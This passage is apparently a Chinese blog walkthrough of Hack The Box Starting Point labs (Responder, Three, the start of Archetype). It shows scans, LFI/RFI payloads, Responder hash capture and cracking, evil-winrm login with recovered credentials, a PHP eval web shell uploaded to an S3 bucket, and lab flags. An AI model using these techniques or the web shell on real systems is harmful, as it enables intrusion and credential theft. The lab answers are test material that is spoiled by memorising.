class="code"><pre><code class="hljs applescript">What FTP code <span class="hljs-keyword">is</span> returned <span class="hljs-keyword">to</span> us <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Anonymous FTP login allowed&quot;</span> message?<br>:<span class="hljs-number">230</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-2"><a href="#Task-4-2" class="headerlink" title="Task 4"></a>Task 4</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">After connecting <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> FTP server <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">ftp</span> client, what username <span class="hljs-built_in">do</span> we provide when prompted <span class="hljs-built_in">to</span> <span class="hljs-built_in">log</span> <span class="hljs-keyword">in</span> anonymously?<br>:anonymous<br></code></pre></td></tr></table></figure><h3 id="Task-5-2"><a href="#Task-5-2" class="headerlink" title="Task 5"></a>Task 5</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">After</span> connecting <span class="hljs-keyword">to</span> the FTP <span class="hljs-keyword">server</span> anonymously, what command can we use <span class="hljs-keyword">to</span> download the files we find <span class="hljs-keyword">on</span> the FTP <span class="hljs-keyword">server</span>?<br>:<span class="hljs-keyword">get</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-2"><a href="#Task-6-2" class="headerlink" title="Task 6"></a>Task 6</h3><p>用 <code>get</code> 传下来，可以看到是 <code>admin</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/bb5a428db75020be.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-literal">one</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> higher-privilege sounding usernames <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;allowed.userlist&#x27;</span> that we download <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> FTP server?<br>:admin<br></code></pre></td></tr></table></figure><h3 id="Task-7-2"><a href="#Task-7-2" class="headerlink" title="Task 7"></a>Task 7</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> Apache HTTP Server <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> target host?<br>:Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-1"><a href="#Task-8-1" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">What <span class="hljs-keyword">switch</span> can we <span class="hljs-keyword">use</span> <span class="hljs-keyword">with</span> Gobuster to specify we are looking <span class="hljs-keyword">for</span> specific filetypes?<br>:-x<br></code></pre></td></tr></table></figure><h3 id="Task-9-1"><a href="#Task-9-1" class="headerlink" title="Task 9"></a>Task 9</h3><p>扫目录扫到 <code>login.php</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/817d73711a6e521a.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which PHP <span class="hljs-built_in">file</span> can we identify <span class="hljs-keyword">with</span> <span class="hljs-built_in">directory</span> brute force that will provide <span class="hljs-keyword">the</span> opportunity <span class="hljs-built_in">to</span> authenticate <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> web service?<br>:login.php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-2"><a href="#Submit-Flag-2" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>把 <code>allowed.userlist.passwd</code> 传下来，里面有密码，使用 <code>admin:rKXM59ESxesUFHAd</code> 登录</p><p><img src="https://img.dkdun.cn/v1/2025/12/666a284f93314fa3.png"></p><p>进去就是 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/871d943e7b05148c.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:c7110277ac44d78b6a9fff2232434d16<br></code></pre></td></tr></table></figure><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><h3 id="Task-1-3"><a href="#Task-1-3" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# <span class="hljs-keyword">nmap</span> -sS -sV -Pn <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://<span class="hljs-keyword">nmap</span>.org ) at <span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">01</span>:<span class="hljs-number">52</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span><br>Host <span class="hljs-keyword">is</span> <span class="hljs-keyword">up</span> (<span class="hljs-number">0.37</span>s latency).<br>Not shown: <span class="hljs-number">999</span> filtered tcp ports (<span class="hljs-keyword">no</span>-response)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp <span class="hljs-keyword">open</span>  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">52</span> ((Win64) OpenSSL/<span class="hljs-number">1.1</span>.<span class="hljs-number">1</span><span class="hljs-keyword">m</span> PHP/<span class="hljs-number">8.1</span>.<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>访问 80 端口</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">When visiting <span class="hljs-keyword">the</span> web service <span class="hljs-keyword">using</span> <span class="hljs-keyword">the</span> IP address, what is <span class="hljs-keyword">the</span> domain that we are being redirected <span class="hljs-built_in">to</span>?<br>:unika.htb<br></code></pre></td></tr></table></figure><h3 id="Task-2-3"><a href="#Task-2-3" class="headerlink" title="Task 2"></a>Task 2</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which scripting <span class="hljs-keyword">language</span> <span class="hljs-keyword">is</span> being used <span class="hljs-keyword">on</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">to</span> generate webpages?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Task-3-3"><a href="#Task-3-3" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">URL</span> parameter which is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span> different language versions <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> webpage?<br>:page<br></code></pre></td></tr></table></figure><h3 id="Task-4-3"><a href="#Task-4-3" class="headerlink" title="Task 4"></a>Task 4</h3><p>本地文件包含 (LFI)，就是读取一些系统本地的敏感信息，一般通过路径来读取</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams">Which of the following values <span class="hljs-keyword">for</span> the `page` <span class="hljs-keyword">parameter</span> would <span class="hljs-comment">be an example of exploiting a Local File Include (LFI) vulnerability:</span> <span class="hljs-comment">&quot;french.html&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;//10.10.14.6/somefile&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span><span class="hljs-comment">,</span> <span class="hljs-comment">&quot;minikatz.exe&quot;</span><br>:../../../../../../../../windows/system32/drivers/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-5-3"><a href="#Task-5-3" class="headerlink" title="Task 5"></a>Task 5</h3><p>远程文件包含，参数一般是一个远程的 url 地址</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Which</span> of the following values <span class="hljs-keyword">for</span> the `page` parameter would be <span class="hljs-keyword">an</span> example of exploiting a Remote <span class="hljs-keyword">File</span> <span class="hljs-keyword">Include</span> (RFI) vulnerability: <span class="hljs-string">&quot;french.html&quot;</span>, <span class="hljs-string">&quot;//10.10.14.6/somefile&quot;</span>, <span class="hljs-string">&quot;../../../../../../../../windows/system32/drivers/etc/hosts&quot;</span>, <span class="hljs-string">&quot;minikatz.exe&quot;</span><br>:<span class="hljs-comment">//10.10.14.6/somefile</span><br></code></pre></td></tr></table></figure><h3 id="Task-6-3"><a href="#Task-6-3" class="headerlink" title="Task 6"></a>Task 6</h3><p>简单了解了一下 NTLM，New Technology LAN Manager，是微软用于 Windows 身份验证的一个协议。官方说的是：</p><p> NTLM 身份验证协议根据一种证明是服务器或域控制器的挑战&#x2F;响应机制对用户和计算机进行身份验证，用户要知道该服务器和域控制器的与帐户关联的密码。 在使用 NTLM 协议时，每当需要新的访问令牌时，资源服务器必须执行以下操作之一来验证计算机或用户的身份：</p><ul><li>如果计算机或用户的帐户是域帐户，请联系域控制器的部门域认证服务来获取该帐户的域。</li><li>如果该计算机或用户的帐户是本地帐户，请在本地帐户数据库中查找该帐户。</li></ul><p>官方确实太官方了，说白了就是 <code>challenge/response</code> 认证机制在验证用户的过程中是不需要传输用户的明文密码的。</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">What does NTLM stand <span class="hljs-keyword">for</span>?<br>:<span class="hljs-keyword">New</span> Technology LAN Manager<br></code></pre></td></tr></table></figure><h3 id="Task-7-3"><a href="#Task-7-3" class="headerlink" title="Task 7"></a>Task 7</h3><p>Responder 是一款少有的可以通过中继 NTLMv2哈希来获取网络中机器的 shell 访问权限的内网工具，详细了解可以看  <a href="https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/">https://ew1z4rd.github.io/post/Responder%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%A5%9E%E5%99%A8/</a> 这篇文章，这个工具 kali 自带</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">Which</span> flag <span class="hljs-keyword">do</span> we <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> the <span class="hljs-title class_">Responder</span> utility to specify the network interface?<br><span class="hljs-symbol">:-I</span><br></code></pre></td></tr></table></figure><h3 id="Task-8-2"><a href="#Task-8-2" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">There are several tools <span class="hljs-keyword">that</span> take a NetNTLMv2 challenge/response <span class="hljs-keyword">and</span> <span class="hljs-keyword">try</span> millions <span class="hljs-keyword">of</span> passwords <span class="hljs-keyword">to</span> see <span class="hljs-keyword">if</span> any <span class="hljs-keyword">of</span> them generate <span class="hljs-keyword">the</span> same response. One such tool <span class="hljs-keyword">is</span> often referred <span class="hljs-keyword">to</span> <span class="hljs-keyword">as</span> `john`, <span class="hljs-keyword">but</span> <span class="hljs-keyword">the</span> full <span class="hljs-built_in">name</span> <span class="hljs-keyword">is</span> what?.<br>:John The Ripper<br></code></pre></td></tr></table></figure><h3 id="Task-9-2"><a href="#Task-9-2" class="headerlink" title="Task 9"></a>Task 9</h3><p>指定 </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">responder -<span class="hljs-selector-tag">I</span> tun0<br></code></pre></td></tr></table></figure><p>然后访问一个不存在的文件让它报错</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//u</span>nika.htb<span class="hljs-regexp">/?page=/</span><span class="hljs-regexp">/10.10.16.51/</span>butt3rf1y<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/cb8b139a7a41f58e.png"></p><p>把 <code>Hash</code> 那串复制下来爆破，但是我用 john 破解的时候出现了如下报错</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─# john b.txt<br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">No</span> <span class="hljs-keyword">password</span> hashes left <span class="hljs-keyword">to</span> crack (see FAQ)<br></code></pre></td></tr></table></figure><p>查了一番才知道，这个报错原因是因为这个文件被破解过（哪来的啊？？？why？？？），结果就在 john.pot 中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿butt3rf1y)-[<span class="hljs-regexp">/home/</span>butt3rf1y]<br>└─<span class="hljs-comment"># cat ~/.john/john.pot</span><br><span class="hljs-variable">$P</span><span class="hljs-variable">$BtP9ZghJTwDfSn1gKKc</span>.k3mq4Vo.Ko/:<span class="hljs-number">104567</span><br><span class="hljs-variable">$NETNTLMv2</span><span class="hljs-variable">$ADMINISTRATORRESPONDER</span><span class="hljs-variable">$25d61c9246d5479b</span><span class="hljs-variable">$1d382c449a1d964839832984788288f4</span><span class="hljs-variable">$010100000000000080b7bdeb8282db01d76b82bee9aff7d70000000002000800340059004d00370001001e00570049004e002d00470050004b0032004f0054005600460030004800360004003400570049004e002d00470050004b0032004f005400560046003000480036002e00340059004d0037002e004c004f00430041004c0003001400340059004d0037002e004c004f00430041004c0005001400340059004d0037002e004c004f00430041004c000700080080b7bdeb8282db01060004000200000008003000300000000000000001000000002000005ac722d42e809e0b0701cfcf2610b582b82cb93eb9627709f712e596b9e1fec00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00350031000000000000000000</span>:badminton<br></code></pre></td></tr></table></figure><p>或者用 –show 来查看</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">┌──(root㉿butt3rf1y)-[<span class="hljs-regexp">/home/butt</span>3rf1y]<br>└─<span class="hljs-comment"># john --show b.txt</span><br><span class="hljs-title class_">Administrator</span><span class="hljs-symbol">:badminton</span><span class="hljs-symbol">:RESPONDER</span><span class="hljs-symbol">:</span>25<span class="hljs-symbol">d61c9246d5479b:</span>1<span class="hljs-symbol">D382C449A1D964839832984788288F4:</span>010100000000000080B7BDEB8282DB01D76B82BEE9AFF7D70000000002000800340059004D00370001001E00570049004E002D00470050004B0032004F0054005600460030004800360004003400570049004E002D00470050004B0032004F005400560046003000480036002E00340059004D0037002E004C004F00430041004C0003001400340059004D0037002E004C004F00430041004C0005001400340059004D0037002E004C004F00430041004C000700080080B7BDEB8282DB01060004000200000008003000300000000000000001000000002000005AC722D42E809E0B0701CFCF2610B582B82CB93EB9627709F712E596B9E1FEC00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00350031000000000000000000<br></code></pre></td></tr></table></figure><p>密码是 <code>badminton</code> </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the administrator <span class="hljs-keyword">user</span>?<br>:badminton<br></code></pre></td></tr></table></figure><h3 id="Task-10-1"><a href="#Task-10-1" class="headerlink" title="Task 10"></a>Task 10</h3><p>nmap 扫</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">We<span class="hljs-comment">&#x27;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</span><br>:<span class="hljs-number">5985</span><br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-3"><a href="#Submit-Flag-3" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>5985 主要是 <code>WinRM</code>（Windows Remote Managementd）,Windows 的远程管理，使用 WinRM 可以在对方有设置防火墙的情况下远程管理这台服务器，因为启动 WinRM 服务后，防火墙默认会放行 5985 端口。</p><p><a href="https://github.com/Hackplayers/evil-winrm">Evil-WinRM</a>，kali 自带</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">40.166</span> -u administrator -<span class="hljs-selector-tag">p</span> badminton<br></code></pre></td></tr></table></figure><p>登进去之后发现啥也没有，一直找，找到了个 <code>mike</code> 用户</p><p><img src="https://img.dkdun.cn/v1/2025/12/20560db0a57c4adb.png"></p><p>在 <code>mike</code> 用户下找到 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/47ed4fe5b5551c29.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:ea81b7afddd03efaa0945333ed147fac<br></code></pre></td></tr></table></figure><h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><h3 id="Task-1-4"><a href="#Task-1-4" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿butt3rf1y)-[/home/butt3rf1y]<br>└─<span class="hljs-comment"># nmap -sS -sV -Pn 10.129.131.234</span><br>Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-19</span> <span class="hljs-number">04</span>:<span class="hljs-number">49</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.131</span><span class="hljs-number">.234</span><br>Host is up (<span class="hljs-number">0.50</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp <span class="hljs-built_in">open</span>  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.7</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.29</span> ((Ubuntu))<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">16.03</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many TCP ports <span class="hljs-keyword">are</span> <span class="hljs-keyword">open</span>?<br>:2<br></code></pre></td></tr></table></figure><h3 id="Task-2-4"><a href="#Task-2-4" class="headerlink" title="Task 2"></a>Task 2</h3><p><img src="https://img.dkdun.cn/v1/2025/12/8b55f16dce97c2ef.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> domain <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> email address provided <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-string">&quot;Contact&quot;</span> section <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> website?<br>:thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-3-4"><a href="#Task-3-4" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">In <span class="hljs-keyword">the</span> absence <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> DNS server, which Linux <span class="hljs-built_in">file</span> can we use <span class="hljs-built_in">to</span> <span class="hljs-built_in">resolve</span> hostnames <span class="hljs-built_in">to</span> IP addresses <span class="hljs-keyword">in</span> order <span class="hljs-built_in">to</span> be able <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> websites that point <span class="hljs-built_in">to</span> those hostnames?<br>:/etc/hosts<br></code></pre></td></tr></table></figure><h3 id="Task-4-4"><a href="#Task-4-4" class="headerlink" title="Task 4"></a>Task 4</h3><p>用 gobuster 扫描</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gobuster vhost -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">5000</span>.txt -u http:<span class="hljs-regexp">//</span>thetoppers.htb  --append-domain<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/f53fb6547ca682e2.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">Which<span class="hljs-built_in"> sub-domain </span>is discovered during further enumeration?<span class="hljs-keyword"></span><br><span class="hljs-keyword">:s3</span>.thetoppers.htb<br></code></pre></td></tr></table></figure><h3 id="Task-5-4"><a href="#Task-5-4" class="headerlink" title="Task 5"></a>Task 5</h3><p>只有一条 json 信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/848b7df5aaf46e7f.png"></p><p>搜了一下 s3，Amazon S3, 全名 Amazon Simple Storage Service，Amazon 提供的网络数据存储服务</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Which service <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> <span class="hljs-keyword">the</span> discovered sub-domain?<br>:Amazon S3<br></code></pre></td></tr></table></figure><h3 id="Task-6-4"><a href="#Task-6-4" class="headerlink" title="Task 6"></a>Task 6</h3><p>可以通过 AWSCLI 来与 s3 进行交互，具体请看 <a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-welcome.html">AWS CLI</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Which command <span class="hljs-type">line</span> utility can be used <span class="hljs-keyword">to</span> interact <span class="hljs-keyword">with</span> the service running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>:awscli<br></code></pre></td></tr></table></figure><h3 id="Task-7-4"><a href="#Task-7-4" class="headerlink" title="Task 7"></a>Task 7</h3><p>具体看官方文档</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">Which <span class="hljs-keyword">command</span> <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> <span class="hljs-keyword">up</span> the AWS CLI installation?<br>:aws configure<br></code></pre></td></tr></table></figure><h3 id="Task-8-3"><a href="#Task-8-3" class="headerlink" title="Task 8"></a>Task 8</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint</span> http:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">command</span> used by the above utility <span class="hljs-keyword">to</span> <span class="hljs-keyword">list</span> <span class="hljs-keyword">all</span> of the S3 buckets?<br>:aws s3 <span class="hljs-keyword">ls</span><br></code></pre></td></tr></table></figure><h3 id="Task-9-3"><a href="#Task-9-3" class="headerlink" title="Task 9"></a>Task 9</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aws</span> --endpoint http://s3.thetoppers.htb s3 ls<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>          <span class="hljs-number">0</span> .htaccess<br><span class="hljs-attribute">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">19</span> <span class="hljs-number">04</span>:<span class="hljs-number">43</span>:<span class="hljs-number">54</span>      <span class="hljs-number">11952</span> index.php<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">This <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> configured <span class="hljs-keyword">to</span> run files written <span class="hljs-keyword">in</span> what web scripting <span class="hljs-keyword">language</span>?<br>:php<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-4"><a href="#Submit-Flag-4" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>写一个一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传上去</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws --endpoint http://s3.thetoppers.htb s3 <span class="hljs-built_in">cp</span> shell.php s3://thetoppers.htb/shell.php<br></code></pre></td></tr></table></figure><p>然后直接 curl</p><p><img src="https://img.dkdun.cn/v1/2025/12/3fe56a29ed468bdc.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:a980d99281a28d638ac68b9bf9453c2b<br></code></pre></td></tr></table></figure><h1 id="Tier-2"><a href="#Tier-2" class="headerlink" title="Tier 2"></a>Tier 2</h1><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><h3 id="Task-1-5"><a href="#Task-1-5" class="headerlink" title="Task 1"></a>Task 1</h3><p>nmap 扫描，扫到了 1433 端口的 <code>ms-sql-s</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 